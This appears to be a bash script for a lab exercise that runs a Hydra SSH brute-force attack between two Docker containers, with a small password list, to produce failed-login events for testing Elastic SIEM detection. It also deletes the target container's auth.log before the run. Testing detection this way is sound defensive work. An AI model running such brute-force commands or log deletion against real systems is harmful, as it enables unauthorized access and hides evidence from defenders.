#!/bin/bash

# Clear old logs
docker exec ssh-target rm -f /var/log/auth.log

# Create password list for the brute-force attack
docker exec hydra-attacker bash -c "echo 'password123' > /tmp/passwords.txt"
docker exec hydra-attacker bash -c "echo 'admin' >> /tmp/passwords.txt"
docker exec hydra-attacker bash -c "echo '123456' >> /tmp/passwords.txt" 
docker exec hydra-attacker bash -c "echo 'testpassword' >> /tmp/passwords.txt" # The correct password

echo "Starting brute-force attack with Hydra..."
echo "This will generate failed login attempts that should be visible in Elastic SIEM"

# Find the IP address of the ssh-target container
SSH_TARGET_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' ssh-target)

echo "Target SSH Server IP: $SSH_TARGET_IP"

# Run Hydra attack with verbose logging
docker exec hydra-attacker hydra -l testuser -P /tmp/passwords.txt $SSH_TARGET_IP -s 2222 ssh -V -t 1

echo "Attack simulation completed."
echo "Verifying logs made it to Elasticsearch..."

# Wait 10 seconds for log processing
sleep 10

# Check logs directly in SSH container
echo "SSH Container Log Contents:"
docker exec ssh-target cat /var/log/auth.log || echo "No auth.log found"
docker logs ssh-target | grep -i password

echo "Check Elastic SIEM for alerts."
